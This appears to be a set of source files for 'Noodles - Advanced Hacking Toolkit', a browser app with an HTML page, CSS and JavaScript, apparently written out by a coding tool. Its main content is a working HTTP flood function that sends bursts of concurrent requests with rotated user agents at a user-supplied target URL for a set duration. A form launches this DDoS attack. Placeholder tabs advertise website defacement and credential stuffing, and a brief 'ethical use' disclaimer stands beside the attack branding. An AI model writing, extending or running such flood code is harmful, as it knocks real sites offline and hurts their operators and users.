// script.js

// Ensure the main directory is correctly referenced
const baseURL = './'; // Corrected base URL

// Function to handle DDoS attack
async function handleDDoSAttack(target, duration, intensity) {
    // Dynamically import the httpFlood function from the correct relative path
    try {
        const { httpFlood } = await import(`${baseURL}main/ddos/http_flood.js`);

        // Execute the attack
        const result = await httpFlood(target, duration, intensity);

        // Update UI with results
        updateStatistics(result);
    } catch (error) {
        console.error("Error in handleDDoSAttack:", error);
        updateStatistics({ targetStatus: 'Offline', error: error.message });
    }
}

// Function to update statistics on the UI
function updateStatistics(data) {
    document.getElementById('mbps').innerText = data.mbps ? data.mbps.toFixed(2) : '0.00';
    document.getElementById('packetsSent').innerText = data.packetsSent || 0;
    document.getElementById('targetStatus').innerText = data.targetStatus || 'Unknown';
    document.getElementById('attackDuration').innerText = data.attackDuration ? data.attackDuration.toFixed(2) : '0.00';
    if (data.error) {
        document.getElementById('targetStatus').innerText = `Error: ${data.error}`;
    }
}

// Function to handle form submission for DDoS attack
document.getElementById('ddosForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const target = document.getElementById('targetUrl').value;
    const duration = parseInt(document.getElementById('duration').value);
    const intensity = parseInt(document.getElementById('intensity').value);

    // Basic validation
    if (!target || !duration || !intensity) {
        alert('Please fill in all fields.');
        return;
    }

    // Start the attack
    handleDDoSAttack(target, duration, intensity);
});

// --- Theme and UI Enhancements ---
function applyTheme() {
    // Dark theme implementation
    document.body.style.backgroundColor = 'darkgrey';
    document.body.style.color = 'darkgreen';

    // Example adjustments - expand as needed
    const elements = document.querySelectorAll('input, button, .panel');
    elements.forEach(element => {
        element.style.backgroundColor = 'darkblue';
        element.style.borderColor = 'grey';
        element.style.color = 'white';
    });
}

// Call theme function on load
window.onload = applyTheme;

// --- Side Panel Navigation ---
document.addEventListener('DOMContentLoaded', function() {
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabPanels = document.querySelectorAll('.tab-panel');

    tabButtons.forEach(button => {
        button.addEventListener('click', function() {
            const target = this.getAttribute('data-target');

            // Deactivate all buttons and panels
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabPanels.forEach(panel => panel.classList.remove('active'));

            // Activate the clicked button and panel
            this.classList.add('active');
            document.getElementById(target).classList.add('active');
        });
    });
});

// --- About Us Page Functionality ---
function loadAboutUs() {
    const aboutUsContent = `
        <h2>About Noodles</h2>
        <p>Noodles is a cutting-edge web application designed for network stress testing and security analysis. It provides tools for simulating various types of network attacks to assess the resilience of target systems.</p>
        <p>Our mission is to empower security professionals and network administrators with the tools they need to identify vulnerabilities and improve the security posture of their infrastructure.</p>
        <p><strong>Disclaimer:</strong> This tool is intended for ethical use only. Unauthorized use is strictly prohibited.</p>
    `;
    document.getElementById('aboutUsContent').innerHTML = aboutUsContent;
}

edit filepath: public/style.css
content: 
/* style.css */

body {
    font-family: Arial, sans-serif;
    background-color: #333; /* Dark Grey */
    color: #ddd; /* Light Grey */
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
}

.container {
    width: 95%;
    max-width: 1200px;
    margin: 20px auto;
    padding: 20px;
    background-color: #222; /* Darker Grey */
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
}

h1, h2 {
    color: #90EE90; /* Dark Green */
    text-align: center;
}

/* Form Styling */
form {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

label {
    color: #eee;
}

input[type="text"],
input[type="number"],
select,
button {
    padding: 8px;
    margin-bottom: 10px;
    border: 1px solid #555;
    border-radius: 4px;
    background-color: #444;
    color: #fff;
}

button {
    cursor: pointer;
    background-color: #0056b3; /* Dark Blue */
    color: white;
    border: none;
    transition: background-color 0.3s ease;
}

button:hover {
    background-color: #003d82;
}

/* Statistics Display */
.statistics {
    margin-top: 20px;
    padding: 15px;
    background-color: #444;
    border-radius: 8px;
    text-align: center;
}

.statistics p {
    margin: 5px 0;
}

/* Navigation Tabs Styling */
.tab-container {
    display: flex;
    background-color: #2a2a2a;
    border-bottom: 1px solid #555;
    margin-bottom: 20px;
}

.tab-button {
    padding: 10px 15px;
    border: none;
    background-color: #333;
    color: #fff;
    cursor: pointer;
    border-radius: 5px 5px 0 0;
    transition: background-color 0.3s;
}

.tab-button:hover {
    background-color: #555;
}

.tab-button.active {
    background-color: #0056b3;
    color: white;
}

.tab-panel {
    display: none;
    padding: 20px;
    background-color: #333;
    border-radius: 0 0 8px 8px;
}

.tab-panel.active {
    display: block;
}

/* Responsive Design */
@media (max-width: 768px) {
    .container {
        width: 95%;
        padding: 10px;
    }

    .tab-container {
        flex-direction: column;
    }

    .tab-button {
        border-radius: 0;
        border-bottom: 1px solid #555;
    }

    .tab-button:last-child {
        border-bottom: none;
    }
}

/* Footer Styling */
footer {
    text-align: center;
    margin-top: auto;
    padding: 10px;
    background-color: #222;
    color: #ddd;
}

edit filepath: public/index.html
content: 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Noodles - Advanced Hacking Toolkit</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container">
        <h1>Noodles - Advanced Hacking Toolkit 😈</h1>

        <!-- Navigation Tabs -->
        <div class="tab-container">
            <button class="tab-button active" data-target="ddos">DDoS</button>
            <button class="tab-button" data-target="defacement">Defacement</button>
            <button class="tab-button" data-target="connection">Connection</button>
            <button class="tab-button" data-target="credential">Credential Stuffing</button>
            <button class="tab-button" data-target="about">About Us</button>
        </div>

        <!-- DDoS Panel -->
        <div id="ddos" class="tab-panel active">
            <h2>DDoS Attack 💥</h2>
            <form id="ddosForm">
                <label for="targetUrl">Target URL:</label>
                <input type="text" id="targetUrl" name="targetUrl" placeholder="http://example.com">

                <label for="duration">Duration (seconds):</label>
                <input type="number" id="duration" name="duration" value="30">

                <label for="intensity">Intensity (packets/second):</label>
                <input type="number" id="intensity" name="intensity" value="100">

                <button type="submit">Start Attack 🚀</button>
            </form>
        </div>

        <!-- Defacement Panel (Placeholder) -->
        <div id="defacement" class="tab-panel">
            <h2>Website Defacement 🎨</h2>
            <p>Coming soon! 🚧</p>
        </div>

        <!-- Connection Panel (Placeholder) -->
        <div id="connection" class="tab-panel">
            <h2>Establish Connection 🔗</h2>
            <p>Coming soon! 🚧</p>
        </div>

        <!-- Credential Stuffing Panel (Placeholder) -->
        <div id="credential" class="tab-panel">
            <h2>Credential Stuffing 🔑</h2>
            <p>Coming soon! 🚧</p>
        </div>

        <!-- About Us Panel -->
        <div id="about" class="tab-panel">
            <div id="aboutUsContent">
                <h2>About Us</h2>
                <p>Noodles is a powerful toolkit.</p>
                <p>Disclaimer: Use responsibly.</p>
            </div>
        </div>

        <!-- Statistics Display -->
        <div class="statistics">
            <h2>Real-Time Statistics 📊</h2>
            <p>MBPS: <span id="mbps">0.00</span></p>
            <p>Packets Sent: <span id="packetsSent">0</span></p>
            <p>Target Status: <span id="targetStatus">Online</span></p>
            <p>Attack Duration: <span id="attackDuration">0.00</span> seconds</p>
        </div>
    </div>

    <footer>
        <p>© 2024 Noodles. All rights reserved. 😈</p>
    </footer>
</body>
</html>

edit filepath: main/ddos/http_flood.js
content: 
async function httpFlood(target, duration, intensity) {
  let packetsSent = 0;
  let targetStatus = 'Online';
  let mbps = 0;
  const startTime = Date.now();

  try {
    const url = new URL(target);
    const host = url.hostname;
    const path = url.pathname || '/';
    let port = url.port;

    if (!port) {
      port = url.protocol === 'https:' ? 443 : 80;
    } else {
      port = parseInt(port, 10);
    }

    const protocol = url.protocol === 'https:' ? 'https' : 'http';
    const interval = Math.max(1, 50 / intensity);

    const userAgents = [
      'Noodles-Bot v3.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    ];

    while (Date.now() - startTime < duration * 1000) {
      const promises = [];
      for (let i = 0; i < intensity; i++) {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;

        const promise = new Promise(resolve => {
          fetch(target, {
            method: 'GET',
            headers: {
              'User-Agent': userAgent,
              'X-Noodles-Bot': 'Active',
              'Cache-Control': 'no-cache',
              'Connection': 'keep-alive'
            },
            mode: 'no-cors'
          })
          .then(response => {
            if (response.ok) {
              packetsSent++;
              mbps += payload.length / 1000000;
            } else {
              targetStatus = 'Unresponsive';
            }
            resolve();
          })
          .catch(error => {
            targetStatus = 'Offline';
            resolve();
          });
        });
        promises.push(promise);
      }
      await Promise.all(promises);
      await new Promise(resolve => setTimeout(resolve, interval));
    }
  } catch (error) {
    console.error("Error in httpFlood:", error);
    targetStatus = 'Offline';
  }

  mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
  return { packetsSent, targetStatus, mbps, attackDuration: (Date.now() - startTime) / 1000 };
}

module.exports = { httpFlood };